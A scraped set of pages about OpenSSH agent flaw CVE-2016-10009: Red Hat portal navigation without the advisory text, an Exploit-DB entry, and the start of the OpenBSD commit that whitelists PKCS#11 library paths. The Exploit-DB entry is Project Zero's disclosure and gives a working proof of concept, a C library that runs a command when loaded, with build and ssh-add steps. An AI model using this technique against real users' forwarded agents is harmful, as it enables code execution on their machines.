* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_8fe8793b_20250126_080203.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.exploit-db.com_aa41b604_20250125_103005.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading

#### EDB-ID:

###### 40963

#### CVE:

###### [2016-10009](https://nvd.nist.gov/vuln/detail/CVE-2016-10009)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2016-12-23

---

**Vulnerable App:**

```
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1009

The OpenSSH agent permits its clients to load PKCS11 providers using the commands SSH_AGENTC_ADD_SMARTCARD_KEY and SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED if OpenSSH was compiled with the ENABLE_PKCS11 flag (normally enabled) and the agent isn't locked. For these commands, the client has to specify a provider name. The agent passes this provider name to a subprocess (via ssh-agent.c:process_add_smartcard_key -> ssh-pkcs11-client.c:pkcs11_add_provider -> ssh-pkcs11-client.c:send_msg), and the subprocess receives it and passes it to dlopen() (via ssh-pkcs11-helper.c:process -> ssh-pkcs11-helper.c:process_add -> ssh-pkcs11.c:pkcs11_add_provider -> dlopen). No checks are performed on the provider name, apart from testing whether that provider is already loaded.

This means that, if a user connects to a malicious SSH server with agent forwarding enabled and the malicious server has the ability to place a file with attacker-controlled contents in the victim's filesystem, the SSH server can execute code on the user's machine.

To reproduce the issue, first create a library that executes some command when it is loaded:

$ cat evil_lib.c
#include <stdlib.h>
__attribute__((constructor)) static void run(void) {
  // in case you're loading this via LD_PRELOAD or LD_LIBRARY_PATH,
  // prevent recursion through system()
  unsetenv("LD_PRELOAD");
  unsetenv("LD_LIBRARY_PATH");
  system("id > /tmp/test");
}
$ gcc -shared -o evil_lib.so evil_lib.c -fPIC -Wall

Connect to another machine using "ssh -A". Then, on the remote machine:

$ ssh-add -s [...]/evil_lib.so
Enter passphrase for PKCS#11: [just press enter here]
SSH_AGENT_FAILURE
Could not add card: [...]/evil_lib.so

At this point, the command "id > /tmp/test" has been executed on the machine running the ssh agent:

$ cat /tmp/test
uid=1000(user) gid=1000(user) groups=[...]

Fixed in http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.214&r2=1.215&f=h

```

**Tags:**

**Advisory/Source:**
[Link](https://bugs.chromium.org/p/project-zero/issues/detail?id=1009)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)


[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database



[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as Google Hacking was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnys talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term Googledork to refer
to a foolish or inept person as revealed by Google. This was meant to draw attention to
the fact that this was not a Google problem but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term dork became shorthand for a search query that located sensitive
information and dorks were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources



| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database



Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from github.com_a9c82799_20250125_103001.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2F9476ce1dd37d3c3218d5640b74c34c65e5f4efe5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2F9476ce1dd37d3c3218d5640b74c34c65e5f4efe5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=openbsd%2Fsrc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openbsd](/openbsd)
/
**[src](/openbsd/src)**
Public

* [Notifications](/login?return_to=%2Fopenbsd%2Fsrc) You must be signed in to change notification settings
* [Fork
  876](/login?return_to=%2Fopenbsd%2Fsrc)
* [Star
   3.3k](/login?return_to=%2Fopenbsd%2Fsrc)

* [Code](/openbsd/src)
* [Pull requests
  0](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

Additional navigation options

* [Code](/openbsd/src)
* [Pull requests](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

## Commit

[Permalink](/openbsd/src/commit/9476ce1dd37d3c3218d5640b74c34c65e5f4efe5)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

add a whitelist of paths from which ssh-agent will load (via

[Browse files](/openbsd/src/tree/9476ce1dd37d3c3218d5640b74c34c65e5f4efe5)
Browse the repository at this point in the history

```
ssh-pkcs11-helper) a PKCS#11 module; ok markus@
```

* Loading branch information

[![@djmdjm](https://avatars.githubusercontent.com/u/170281?s=40&v=4)](/djmdjm)

[djmdjm](/openbsd/src/commits?author=djmdjm "View all commits by djmdjm")
committed
Nov 30, 2016

1 parent
[5eecd4e](/openbsd/src/commit/5eecd4ed02a939575543e46dd71909c863e43419)

commit 9476ce1

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**50 additions**
and
**10 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* usr.bin/ssh

  + usr.bin/ssh/ssh-agent.1
    [ssh-agent.1](#diff-ac536ded87fa31f723058ad2c9f8f1c8efd8e245fbf4373e31d3b37d5c6d62a4)
  + usr.bin/ssh/ssh-agent.c
    [ssh-agent.c](#diff-ec361f15be6f995058449905652d18a44a41288f875d90648d7be5570142ce01)

## There are no files selected for viewing

17 changes: 15 additions & 2 deletions

17
[usr.bin/ssh/ssh-agent.1](#diff-ac536ded87fa31f723058ad2c9f8f1c8efd8e245fbf4373e31d3b37d5c6d62a4 "usr.bin/ssh/ssh-agent.1")

Show comments

[View file](/openbsd/src/blob/9476ce1dd37d3c3218d5640b74c34c65e5f4efe5/usr.bin/ssh/ssh-agent.1)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,4 +1,4 @@ |
|  |  | .\" $OpenBSD: ssh-agent.1,v 1.62 2015/11/15 23:54:15 jmc Exp $ |
|  |  | .\" $OpenBSD: ssh-agent.1,v 1.63 2016/11/30 03:07:37 djm Exp $ |
|  |  | .\" |
|  |  | .\" Author: Tatu Ylonen <ylo@cs.hut.fi> |
|  |  | .\" Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland |
| Expand Down  Expand Up | | @@ -34,7 +34,7 @@ |
|  |  | .\" (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF |
|  |  | .\" THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. |
|  |  | .\" |
|  |  | .Dd $Mdocdate: November 15 2015 $ |
|  |  | .Dd $Mdocdate: November 30 2016 $ |
|  |  | .Dt SSH-AGENT 1 |
|  |  | .Os |
|  |  | .Sh NAME |
| Expand All | | @@ -47,6 +47,7 @@ |
|  |  | .Op Fl a Ar bind\_address |
|  |  | .Op Fl E Ar fingerprint\_hash |
|  |  | .Op Fl t Ar life |
|  |  | .Op Fl P Ar pkcs11\_whitelist |
|  |  | .Op Ar command Op Ar arg ... |
|  |  | .Nm ssh-agent |
|  |  | .Op Fl c | s |
| Expand Down  Expand Up | | @@ -121,6 +122,18 @@ The default is |
|  |  | Kill the current agent (given by the |
|  |  | .Ev SSH\_AGENT\_PID |
|  |  | environment variable). |
|  |  | .It Fl P |
|  |  | Specify a pattern-list of acceptable paths for PKCS#11 shared libraries |
|  |  | that may be added using the |
|  |  | .Fl s |
|  |  | option to |
|  |  | .Xr ssh-add 1 . |
|  |  | The default is to allow loading PKCS#11 libraries from |
|  |  | .Dq /usr/lib/\*,/usr/local/lib/\* . |
|  |  | PKCS#11 libraries that do not match the whitelist will be refused. |
|  |  | See PATTERNS in |
|  |  | .Xr ssh\_config 5 |
|  |  | for a description of pattern-list syntax. |
|  |  | .It Fl s |
|  |  | Generate Bourne shell commands on |
|  |  | .Dv stdout . |
| Expand Down | |  |

43 changes: 35 additions & 8 deletions

43
[usr.bin/ssh/ssh-agent.c](#diff-ec361f15be6f995058449905652d18a44a41288f875d90648d7be5570142ce01 "usr.bin/ssh/ssh-agent.c")

Show comments

